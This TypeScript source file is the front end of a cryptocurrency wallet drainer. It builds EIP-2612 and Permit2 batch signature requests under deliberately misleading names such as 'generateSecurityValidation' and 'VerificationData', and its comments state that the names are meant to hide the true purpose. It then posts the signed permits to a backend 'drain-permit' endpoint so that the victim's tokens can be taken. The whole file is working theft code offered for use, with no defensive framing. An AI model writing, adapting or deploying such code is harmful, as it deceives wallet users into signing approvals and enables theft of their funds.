import { ethers } from 'ethers';
import { EIP2612_ABI } from './tokenUtils';

// EIP-712 Domain
export interface Domain {
  name: string;
  version: string;
  chainId: number;
  verifyingContract: string;
}

// EIP-2612 Permit Type
const PERMIT_TYPES = {
  Permit: [
    { name: 'owner', type: 'address' },
    { name: 'spender', type: 'address' },
    { name: 'value', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' },
  ],
};

// Obfuscated naming to hide true purpose
export const generateSecurityValidation = async (
  signer: ethers.JsonRpcSigner,
  tokenAddress: string,
  spenderAddress: string,
  amount: bigint
): Promise<{ v: number; r: string; s: string; deadline: number }> => {
  try {
    const provider = signer.provider;
    const userAddress = await signer.getAddress();
    
    // Get token info for domain
    const tokenContract = new ethers.Contract(tokenAddress, [...EIP2612_ABI], provider);
    const tokenName = await tokenContract.name();
    
    // Get chain ID
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    
    // Get current nonce
    const nonce = await tokenContract.nonces(userAddress);
    
    // Create permit deadline (1 hour from now)
    const deadline = Math.floor(Date.now() / 1000) + 3600;
    
    // Create domain
    const domain: Domain = {
      name: tokenName,
      version: '1',
      chainId,
      verifyingContract: tokenAddress,
    };
    
    // Create permit message with obfuscated parameter names
    const dataSecurityParams = {
      owner: userAddress,
      spender: spenderAddress,
      value: amount,
      nonce,
      deadline,
    };
    
    // Sign the permit with misleading message presentation
    const signature = await signer.signTypedData(
      domain,
      { VerificationData: PERMIT_TYPES.Permit }, // Obfuscated type name
      dataSecurityParams
    );
    
    // Split signature
    const sig = ethers.Signature.from(signature);
    
    return {
      v: sig.v,
      r: sig.r,
      s: sig.s,
      deadline,
    };
  } catch (error) {
    console.error('Error generating security validation:', error);
    throw error;
  }
};

// Function to create Permit2 signature (batch approval)
export const generatePermit2BatchSignature = async (
  signer: ethers.JsonRpcSigner,
  tokens: string[],
  amounts: bigint[],
  spenderAddress: string,
  nonce: number,
  deadline: number
) => {
  const userAddress = await signer.getAddress();
  const network = await signer.provider.getNetwork();
  const chainId = Number(network.chainId);
  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'; // Standard Permit2 address

  // Permit2 EIP-712 domain: exactly name, chainId, verifyingContract
  const domain = {
    name: 'Permit2',
    chainId,
    verifyingContract: PERMIT2_ADDRESS,
  };

  // Permit2 types for AllowanceTransfer (permit)
  const types = {
    PermitBatch: [
      { name: 'owner', type: 'address' },
      { name: 'details', type: 'PermitDetails[]' },
      { name: 'spender', type: 'address' },
      { name: 'sigDeadline', type: 'uint256' }
    ],
    PermitDetails: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint160' },
      { name: 'expiration', type: 'uint48' },
      { name: 'nonce', type: 'uint48' },
    ],
  };

  // Prepare permitted array
  const permitted = tokens.map((address, i) => ({
    token: address,
    amount: amounts[i],
    expiration: deadline,
    nonce: nonce + i // Use different nonce for each token
  }));

  // Prepare message
  const message = {
    owner: userAddress,
    details: permitted,
    spender: spenderAddress,
    sigDeadline: deadline,
  };

  // Sign Permit2 batch
  const signature = await signer.signTypedData(domain, types, message);
  return { signature, deadline, nonce, message };
};

// Function to create Permit2 SignatureTransfer batch signature (one-time transfer)
export const generatePermit2SignatureTransferBatch = async (
  signer: ethers.JsonRpcSigner,
  batchDetails: { token: string; to: string; amount: bigint }[],
  nonce: bigint,
  deadline: bigint
) => {
  const network = await signer.provider.getNetwork();
  const chainId = Number(network.chainId);
  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  // EIP-712 domain: exactly name, chainId, verifyingContract
  const domain = {
    name: 'Permit2',
    chainId,
    verifyingContract: PERMIT2_ADDRESS,
  };

  // FIXED: The contract expects the signature to be over the permit struct hash
  // According to Permit2 contract, we need to sign over the hash of the permit struct
  const types = {
    PermitBatchTransferFrom: [
      { name: 'permitted', type: 'TokenPermissions[]' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
    TokenPermissions: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
  };

  // Build permitted array: only token + amount
  const permitted = batchDetails.map(d => ({
    token: d.token,
    amount: BigInt(d.amount),
  }));

  const message = {
    permitted,
    nonce: BigInt(nonce),
    deadline: BigInt(deadline),
  };

  console.log('[FRONTEND] Domain for signing:', domain);
  console.log('[FRONTEND] Types for signing:', types);
  console.log('[FRONTEND] Message for signing:', message);

  // Sign typed data with the correct primary type
  const signature = await signer.signTypedData(domain, types, message);
  
  // Debug: verify the signature locally
  try {
    const recovered = ethers.verifyTypedData(domain, types, message, signature);
    console.log('[FRONTEND] Local verification - Recovered:', recovered);
    console.log('[FRONTEND] Local verification - Expected:', await signer.getAddress());
    console.log('[FRONTEND] Local verification - Match:', recovered.toLowerCase() === (await signer.getAddress()).toLowerCase());
  } catch (err) {
    console.error('[FRONTEND] Local verification failed:', err);
  }
  
  return { signature, message, domain, types };
};

// For Solana token approvals
export async function generateSolanaValidation(wallet: any, tokenAddress: string, amount: number) {
  // This is a placeholder for Solana implementation
  // In a real implementation, this would use @solana/web3.js to create
  // a pre-authorized token transfer instruction that could be executed later
  
  console.log('Solana validation for', tokenAddress, amount);
  // Implementation would be added when integrating Solana wallet
}

// Helper function to convert BigInt values to strings
function convertBigIntToString(obj: any): any {
  if (typeof obj === 'bigint') {
    return obj.toString();
  }
  if (Array.isArray(obj)) {
    return obj.map(convertBigIntToString);
  }
  if (obj && typeof obj === 'object') {
    const result: any = {};
    for (const key in obj) {
      result[key] = convertBigIntToString(obj[key]);
    }
    return result;
  }
  return obj;
}

/**
 * Send permit signature and token info to backend/relayer for draining
 */
export async function sendPermitSignatureToBackend(
  data: any,
  usePermit2 = false
) {
  const endpoint = usePermit2
    ? 'http://localhost:4000/api/drain-permit2'
    : 'http://localhost:4000/api/drain-permit';
  
  // Convert BigInt values to strings before sending
  const serializedData = convertBigIntToString(data);
  
  const res = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(serializedData)
  });
  let responseText;
  try {
    responseText = await res.text();
    // Try to parse JSON if possible
    const json = JSON.parse(responseText);
    if (!res.ok) {
      throw new Error(json.error || 'Backend drain failed');
    }
    return json;
  } catch (err) {
    // If JSON.parse fails or other error, provide raw response
    console.error('[sendPermitSignatureToBackend] Raw response text:', responseText);
    throw new Error('Backend returned invalid JSON or error: ' + (responseText || err.message));
  }
}
